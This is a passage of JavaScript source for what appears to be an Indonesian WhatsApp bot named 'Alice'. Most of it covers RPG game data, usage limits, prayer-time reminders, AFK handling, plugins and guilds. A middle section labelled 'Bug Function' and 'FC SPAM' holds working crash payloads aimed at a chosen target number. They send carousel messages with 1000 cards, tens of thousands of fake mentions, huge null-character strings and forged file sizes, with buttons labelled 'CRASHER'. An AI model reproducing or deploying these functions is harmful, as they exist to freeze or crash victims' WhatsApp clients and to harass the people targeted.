if (!("premium" in user)) user.premium = false
} else db.data.users[m.sender] = {
chatbotlast: '',
botlast: '',
chatbot: false,
onlygrub: true,
limit: limitUser,
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 30000,
exp: 0,
limit: limitUser,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0
}
} catch (err) {
console.log(err)
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Limit
let limitnya = db.data.users[m.sender].limit
async function uselimit() {
if (isOwner) return
db.data.users[m.sender].limit -= 1
}

const onlyLimit = async() => {
let yameteh = `*乂 Limit - Habis*

Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!
silahkan buy premium untuk mendapatkan limit unlimited ke owner
ketik .owner`
Alice.sendMessage(from, {text: yameteh},{quoted: m})
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Get Suprise
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
const user = global.db.data.users[m.sender] 
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {Alice.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted: m})}

    const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": budy || m.mtype,
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}                
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Auto Shalat Detek Jam
//————————————————————————//
Alice.autoshalat = Alice.autoshalat ? Alice.autoshalat : {};
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Alice.user.id : m.sender;
        let id = m.chat;
        if (id in Alice.autoshalat) {
            return false;
        }
        let jadwalSholat = {
            shubuh: "04:30",
            terbit: "05:52",
            dzuhur: "12:05",
            ashar: "15:32",
            magrib: "18:17",
            isya: "19:33",
        };

        const datek = new Date(
            new Date().toLocaleString("en-US", {
                timeZone: "Asia/Makassar",
            }),
        );
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let caption = `hai kak ${pushname}
waktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat ya,

*${waktu}*
_untuk wilayah Makassar dan sekitarnya._`;
                Alice.autoshalat[id] = [
                    Alice.sendMessage(m.chat, { 
                        text: caption,
                        footer: `© ${ownername} - 2025`,
                        buttons: [
                            {
                                buttonId: "ok", 
                                buttonText: { 
                                    displayText: 'siap' 
                                }, type: 1 }
                        ],
                        viewOnce: true,
                        headerType: 1
                    }, { quoted: m }),
                    setTimeout(async () => {
                        delete Alice.autoshalat[m.chat];
                    }, 57000),
                ];
            }
        }
//————————————————————————////————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Get Total Fitur
let totalfitur = () =>{
var mytext = fs.readFileSync("./Alice.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }       
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Listcase                
//————————————————————————//        
const listCase = () => {
const code = fs.readFileSync("./Alice.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
} 
let teks = Styles(`*Total Case*: ${matches.length} \n\n`)
matches.forEach(function (x) {
   teks += "  ◦  " + x + "\n"
})
return teks
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Sessions Auto Ai
const SESSION_FILE = "./AliceDatabase/ai_sessions.json";
 
let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};
 
function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Uno Game
const unoDatabasePath = './AliceDatabase/uno_games.json';

function readUnoGameData() {
    if (fs.existsSync(unoDatabasePath)) {
        const data = fs.readFileSync(unoDatabasePath);
        return JSON.parse(data);
    }
    return {};
}

function writeUnoGameData(data) {
    fs.writeFileSync(unoDatabasePath, JSON.stringify(data, null, 2));
}

const gamesFilePath = './AliceDatabase/games.json';

function readGamesData() {
    if (!fs.existsSync(gamesFilePath)) {
        fs.writeFileSync(gamesFilePath, JSON.stringify({}));
    }
    const data = fs.readFileSync(gamesFilePath);
    return JSON.parse(data);
}

function writeGamesData(data) {
    fs.writeFileSync(gamesFilePath, JSON.stringify(data, null, 2));
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Badwords ( Group )
//————————————————————————//
const badwords = JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
const addbadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
badwords.push(kata)
fs.writeFileSync('./AliceDatabase/badwords.json',JSON.stringify(badwords))
ReplyRynzz(`Kata kasar "${kata}" berhasil ditambahkan.`)
}

const deletebadwords = async (kata) => {
let badwords=JSON.parse(fs.readFileSync('./AliceDatabase/badwords.json'))
badwords=badwords.filter(word=>word!==kata)
fs.writeFileSync('./AliceDatabase/badwords.json',JSON.stringify(badwords))
ReplyRynzz(`Kata kasar "${kata}" berhasil dihapus.`)
}
//————————————————————————////————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
if (!Alice.public) {
if (!mek.key.isOwner) return
if (!m.key.fromMe) return
}

// Contoh penggunaan
if (command) {
	if (isFiltered(m.chat) && !isOwner && !isPrem && !m.key.fromMe) return ReplyRynzz(`Don't spam! please give pause for a few seconds.`)
	addFilter(m.chat);
};
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Downloader mp4/mp3
//————————————————————————////————————————————————————//
// Afk
if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = msx(getTimee)
ReplyRynzz(`Jangan tag dia! dia sedang AFK\n\nAlasan: ${getReason2}\nSejak: ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yang lalu\n`)
}}

if (body && afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = msx(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Afk/afk.json', JSON.stringify(_afk))
Alice.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari AFK\n\nAlasan: ${getReason}\nSelama: ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik\n`, xy)
}}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Console Log Message
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
Alice.sendPresenceUpdate('available', m.chat)
  const b = body;
  console.log(
    `\x1b[1;31m~\x1b[1;37m> [\x1b[1;32m ▧ Updating Message \x1b[1;37m]\n│ » Waktu ${chalk.yellow(time)}\n│ » Dari ${chalk.blue(pushname)}\n│ » Berada Di ${chalk.yellow(
      groupName ? groupName : "Private Chat"
    )}\n│ » args : ${chalk.white(args.length)}│ » Pesan : ${chalk.green(b)}\n└───···`
  );
            }
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: Alice.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Alice.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Alice.ev.emit('messages.upsert', msg)
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// AMBIL PP USER
try {
    var ppuser = await Alice.profilePictureUrl(m.sender, 'image');
} catch (err) {
    var ppuser = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg';
}

let ppnyauser = await getBuffer(ppuser);
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Tempat Plugins Disini ↓
// Plugins Directory
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
try {
    delete require.cache[require.resolve(filePath)]
    const plugin = require(filePath)
    plugin.filePath = filePath
    plugins.push(plugin)
} catch (error) {
    console.error(`Error loading plugin at ${filePath}:`, error)
}
                }
            })
        }
    })
    return plugins
}
// Plugins
const plugins = loadPlugins(path.resolve(__dirname, "./AlicePlugins"))
const context = { Alice, txt2, ReplyRynzz, xy, xreaction, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, budy, prefix, isCmd, command, args, pushname, text, q, quoted, mime, isMedia, botNumber, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, time, salam, reply }
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//DB PREFIX
//————————————————————————////————————————————————————//
let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!('autoread' in setting)) setting.autoread = false
				if (!("autoTyping" in setting)) setting.autoTyping = false
				if (!("autoRecord" in setting)) setting.autoRecord = true
				if (!("setPrefix" in setting)) setting.setPrefix = "one" //multi, no, all				
                if (!isNumber(setting.status)) setting.status = 0
            } else global.db.data.settings[botNumber] = {
                status: 0,
				autoTyping: false,
				autoRecord: false,
				setPrefix: "one", //multi, no, all
				autoread: false                
            }
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Bug Function New 
async function Xdelayy(target, count) {
let anu = count;

for (let i = 0; i < anu; i++) {
  let push = [];
  let buttt = [];

  for (let j = 0; j < 5; j++) {
    buttt.push({
      "name": "galaxy_message",
      "buttonParamsJson": JSON.stringify({
        "header": "null",
        "body": "xxx",
        "flow_action": "navigate",
        "flow_action_payload": { screen: "FORM_SCREEN" },
        "flow_cta": "Grattler",
        "flow_id": "1169834181134583",
        "flow_message_version": "3",
        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
      })
    });
  }

  for (let k = 0; k < 1000; k++) {
    push.push({
      "body": {
        "text": `\u0000\u0000\u0000\u0000\u0000`
      },
      "footer": {
        "text": "© XyrooRynzz 2025 💀💀💀💀"
      },
      "header": {
        "title": '\u0000\u0000\u0000\u0000 🇭 🇦 🇲 🇦 \u0000\u0000\u0000\u0000',
        "hasMediaAttachment": true,
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m234/AQO1pCM6gZkA93yvvi17fFOLJumneVMbM-4fUoSIkiC5feJsQJLwkOfhsL44vzVVrJWjrmlOkt9cX5ZG9q4Nh6sGD6uNVlXrUcTrNhUPHg?ccb=9-4&oh=01_Q5Aa1QEjq2KLfy7lkPG2BvUbJ6pRKaQYmuWmDBRdYRv9_azlkg&oe=6824724B&_nc_sid=e6ed6c&mms3=true",
          "mimetype": "image/jpeg",
          "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          "fileLength": "99999",
          "height": 0,
          "width": 0,
          "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          "mediaKeyTimestamp": "1721344123",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
          "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
          "scanLengths": [
            247,
            201,
            73,
            63
          ],
          "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
        }
      },
      "nativeFlowMessage": {
        "buttons": []
      }
    });
  }
  
  const carousel = generateWAMessageFromContent(target, {
    "viewOnceMessage": {
      "message": {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        "interactiveMessage": {
          "body": {
            "text": '\u0000\u0000\u0000\u0000'
          },
          "footer": {
            "text": "PELER LU PECAH GA BANG ✌🔪"
          },
          "header": {
            "hasMediaAttachment": false
          },
          "carouselMessage": {
            "cards": [
              ...push
            ]
          }
        }
      }
    }
  }, {});

  await Alice.relayMessage(target, carousel.message, {
    participant: { jid: target }
  });
}
}

// FC SPAM
async function erwin(target) {
let sMents = Array.from({ length: 19000 }, () =>
    `1${Math.floor(Math.random() * 180000)}@s.whatsapp.net`
  );
  await Alice.relayMessage(target, {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "XyrooRynzz",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: ""
                    },
                    contentText: "YOU BITCH \"😮‍💨\"",
                    footerText: "𝐃𝐞𝐥𝐚𝐲 𝐕𝐢𝐬𝐢𝐛𝐥𝐞",
                    buttons: [
                        {
                            buttonId: "👾".repeat(8000),
                            buttonText: {
                                displayText: "👽 CRASHER"
                            },
                            type: 1
                        },
{
                           buttonId: "\u0000".repeat(8),
                            buttonText: {
                                displayText: "👽 CRASHER"
                            },
                            type: 1
                        },
{
                           buttonId: "\u0000".repeat(8),
                            buttonText: {
                                displayText: "👽 CRASHER"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3,
      contextInfo: {
      mentionedJid: sMents,
        participant: "0@s.whatsapp.net",
        remoteJid: "who know's ?",
       quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "© XyrooRinziii 🤭",
              format: 1
            },
            nativeFlowResponseMessage: {
              name: "menu_options",
              paramsJson: "\u0000".repeat(999999),
              version: 3
            },
            contextInfo: {
              isForwarded: true,
              forwardingScore: 9741
            }
          }
        }
      }
    }
  }, { participant: { jid: target },
    messageId: null
  });
}

// Bug Version 1
async function carousel(target) {
let sMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 90000)}@s.whatsapp.net`
  );
  await Alice.relayMessage(target, {
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/41258771_1174167867185286_2361586182713723567_n.enc?ccb=11-4&oh=01_Q5AaIRBwYC6V9Cqs3xvRS12DMUzPUU6GO7a4zB9BV34XNAGT&oe=6817ADFD&_nc_sid=5e03e0&mms3=true",
    "mimetype": "application/pdf",
    "fileSha256": "jMkavP2oUdBFUhe2VgCoQAzsKZPK2mLy43Uz5IPnLtM=",
    "fileLength": "156364",
    "pageCount": 0,
    "mediaKey": "5TVYZQoLxOXfzo945TUcTJqhSkCCTWcc8Qo5mI5T4o0=",
    "fileName": "👽",
    "fileEncSha256": "BlzYfgorbWOebr/gxNoJrdgiwn7rWTAneTvzTOEA56E=",
    "directPath": "/v/t62.7119-24/41258771_1174167867185286_2361586182713723567_n.enc?ccb=11-4&oh=01_Q5AaIRBwYC6V9Cqs3xvRS12DMUzPUU6GO7a4zB9BV34XNAGT&oe=6817ADFD&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1743803635",
caption: "🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫🎫", 
      contextInfo: {
      mentionedJid: sMents,
        participant: "0@s.whatsapp.net",
        remoteJid: "who know's ?",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: null
          }
        }
      }
    }
  }, { participant: { jid: target },
    messageId: null
  });
}

async function img1(target) {
  let listMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQOWuhrEjLtM85nECqrr4fiLErT7D8iOX5YUgbPUHyH-djYXlHkIxOujdzFcRqS4OwMqvhejK3OHqW9mnjVu5fI6p2iWDWj19ct5kmozHQ?ccb=9-4&oh=01_Q5Aa1QF4n7-ZOl3ltrthxoOuRU-Y0XM9q3FP7WD-LkfLdWF0ug&oe=682392AD&_nc_sid=e6ed6c&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "JdSHM2gGqSUmVf07FU8bX3fl7eYJ1JqPy0ZIkmCHRKA=",
    "fileLength": "45916",
    "height": 733,
    "width": 736,
    "mediaKey": "FbqJVf79fWGdCqskxMKBe0sEtuyoURmjD1PO/0tfRwo=",
    "fileEncSha256": "Cd2QwvHXNEPC4cv+5MeiruCUsE8eS4PDpYZ2NsE4rfE=",
    "directPath": "/o1/v/t62.7118-24/f2/m231/AQOWuhrEjLtM85nECqrr4fiLErT7D8iOX5YUgbPUHyH-djYXlHkIxOujdzFcRqS4OwMqvhejK3OHqW9mnjVu5fI6p2iWDWj19ct5kmozHQ?ccb=9-4&oh=01_Q5Aa1QF4n7-ZOl3ltrthxoOuRU-Y0XM9q3FP7WD-LkfLdWF0ug&oe=682392AD&_nc_sid=e6ed6c",
    "mediaKeyTimestamp": "1744546685",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAAAQMEBQIGAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIUQlTkQxA0AHAa9e9wZBbkM9TylJ9wgch6p8yGV63BuFHQ0MSXFoatkwD0BZ1QpIknp2VtaixM6moxd6xvGEEfQCAEwBgAB/8QAJBAAAgICAgICAgMAAAAAAAAAAQIAAwQREBIhMQUiEzJBQlH/2gAIAQEAAT8AEdiFhOyTwOTN8XOAut8Hgzc9iDi8DXBEM8jgHweOksq7KRKMY3sa19qY+DkB2X+olSd7On8wVWNeUNfkCdG7ka9GOdMQOOs6zHLUfIAmFFYAmX4LrlC2tfrLKqzX3EybfsyVrCjj2JoxEdFA3swN50RHNQdi2pgfIJduomEqg27ACZmaLj+GiZVa4719h4MSii1dq0OAn+y/NWo9R5MszbX9eIzs3szGUtUzL+ymd8i8hSxMx8VKB2M+TyUtIRJTc9R2pmPlpaNHwYWLEk8EzBvFN32/VoWxaAbNiZWfZf8AVfCRRwCRAZvUA3CNzTHwSZqDxz//xAAYEQACAwAAAAAAAAAAAAAAAAABMAAQMf/aAAgBAgEBPwBoszUf/8QAGREBAAIDAAAAAAAAAAAAAAAAAQAhECAw/9oACAEDAQE/AOhHJKI3v//Z",
    "scansSidecar": "umZspE+8yw2GvQSUtqXJ7USHwIVUoIOOZVdjLTQKlwx/oWM6eOOMZA==",
    "scanLengths": [
      4937,
      15856,
      9050,
      16073
    ],
    "midQualityFileSha256": "+MOHMd3WPtc3iQ68uQH4n1BhEQxtJsBlGeTj6rHuZg4=",
  caption: "🎧",
          contextInfo: {
            mentionedJid: listMents,
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          }
        }
      }
    }
  }, {});

  await Alice.relayMessage(target, msg.message, {
  participant: { jid: target },
    messageId: msg.key.id
  });
}

// End Function Bug
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Rpg Created 
//————————————————————————//

    const isUserRegistered = (userId) => {
            const data = fs.readFileSync('./AliceSystem/AliceRpg/join.json', 'utf8');
            const users = JSON.parse(data);
            return users.some(user => user.id === userId);
        };
    const ckusrjoin = m.sender
const JSON_FILE_PATH = './AliceSystem/AliceRpg/gacha_result.json';

 async function spinItem(chatId) {
    const items = ['*Mahkota Tuan Buas 👑*', '*Gacha 1x Token 🎟*', '*Emoji Respec++ 😎*', '*Logamon Chip [ More Power Rpg 🔓 ]*', '*Rebootmon Chip [ Super Power Rpg 🔓 ]*'];
    const randomIndex = Math.floor(Math.random() * items.length);
    const selectedItem = items[randomIndex];
    let gachaResults = [];
    try {
        gachaResults = JSON.parse(fs.readFileSync(JSON_FILE_PATH, 'utf-8'));
    } catch (error) {
        console.error('Error reading JSON file:', error);
    }
gachaResults.push({ chatId, item: selectedItem });
    try {
        fs.writeFileSync(JSON_FILE_PATH, JSON.stringify(gachaResults, null, 2));
        console.log('Gacha result saved to JSON file');
    } catch (error) {
        console.error('Error writing JSON file:', error);
    }
    const hasilgacha = `Selamat! Anda mendapatkan: ${selectedItem}\nJika Mendapatkan Item Yang Sama\nAnda Tidak akan Mempunyai nya lebih, Maksimal 1`;
    await ReplyRynzz(hasilgacha)
}


let guilds = {};
let userGuilds = {};
let battleRequests = {};

const guildsPath = './AliceSystem/AliceRpg/Guilds.json';
const userGuildsPath = './AliceSystem/AliceRpg/UserGuilds.json';

// Load data from JSON file
const loadData = (path, defaultValue) => {
    if (fs.existsSync(path)) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf-8'));
        } catch (err) {
            console.error('Error reading JSON file:', err);
            return defaultValue;
        }
    }
    return defaultValue;
};
//GUILD RPG
const pathh = './AliceSystem/AliceRpg/guilds.json';
const userPath = './AliceSystem/AliceRpg/userss.json';

// Load guilds data & sv

if (fs.existsSync(pathh)) {
    guilds = JSON.parse(fs.readFileSync(pathh, 'utf-8'));
}


let users = {};
if (fs.existsSync(userPath)) {
    users = JSON.parse(fs.readFileSync(userPath, 'utf-8'));
}

const saveGuilds = () => {
    fs.writeFileSync(pathh, JSON.stringify(guilds, null, 2));
};


const saveUsers = () => {
    fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
};

    
const createGuild = (guildName, creatorId) => {
    if (guilds[guildName]) {
        return ReplyRynzz(`Guild dengan nama ${guildName} sudah ada.`);
    }

    if (users[creatorId] && users[creatorId].guild) {
        return ReplyRynzz(`Anda sudah menjadi anggota guild: ${users[creatorId].guild}`);
    }

    guilds[guildName] = { leader: creatorId, members: [] };
    users[creatorId] = { guild: guildName, role: 'leader' };

    saveGuilds();
    saveUsers();

    return ReplyRynzz(`Guild ${guildName} berhasil dibuat!`);
};

    const listGuilds = () => {
    const guildNames = Object.keys(guilds);
    if (guildNames.length === 0) {
        return ReplyRynzz("Tidak ada guild yang tersedia.");
    }
    return ReplyRynzz(`Daftar guild yang tersedia:\n- ${guildNames.join('\n- ')}`);
};
    
const getGuildInfo = (guildName) => {
    const guild = guilds[guildName];
    if (!guild) {
        return ReplyRynzz(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

    const leader = guild.leader;
    const members = guild.members;

    let info = `*< G U I L D - I N F O >* 

*Name: ${guildName}*\nLeader: ${leader}\n\nMembers:\n`;
    members.forEach((member, index) => {
        info += `\n${index + 1}. ${member}`;
    });

    return ReplyRynzz(info);
};

    
const joinGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return ReplyRynzz(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

